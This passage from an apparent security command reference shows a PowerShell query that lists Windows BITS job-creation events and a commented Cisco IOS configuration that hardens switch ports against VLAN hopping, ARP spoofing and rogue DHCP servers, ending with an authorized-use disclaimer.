Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
  Where-Object {$_.Id -eq 3} |    # Event 3 = new BITS job created
  Select-Object TimeCreated, Message |
  Format-List
```

---

### Disable DTP on Cisco IOS

> Prevents VLAN hopping attacks by stopping switch ports from being tricked into becoming trunk ports.

```ios
! Apply to every access port (repeat for each interface)
interface GigabitEthernet0/1
  description User Workstation Port
  switchport mode access          ! force access mode — never trunk
  switchport nonegotiate          ! disable DTP — cannot be coerced into trunk
  switchport access vlan 10       ! assign to correct VLAN
  spanning-tree portfast          ! fast port activation (STP optimization)
  spanning-tree bpduguard enable  ! shut port if a switch is connected here

! Set a dedicated native VLAN that no host uses (prevents double-tagging)
interface GigabitEthernet0/24
  description Uplink Trunk
  switchport mode trunk
  switchport trunk native vlan 999   ! VLAN 999 = unused dummy native VLAN
  switchport trunk allowed vlan 10,20,30

! Enable BPDU Guard globally on all PortFast-enabled ports
spanning-tree portfast bpduguard default

! Enable Dynamic ARP Inspection (DAI) — prevents ARP spoofing + MITM
ip arp inspection vlan 10,20,30

! Enable DHCP Snooping — prevents rogue DHCP servers
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
no ip dhcp snooping information option

! Enable IP Source Guard — ties IPs to physical switch ports
interface GigabitEthernet0/1
  ip verify source
```

---

*All commands are for authorized penetration testing and defensive security purposes only. Never use against systems you do not own or have explicit written permission to test.*
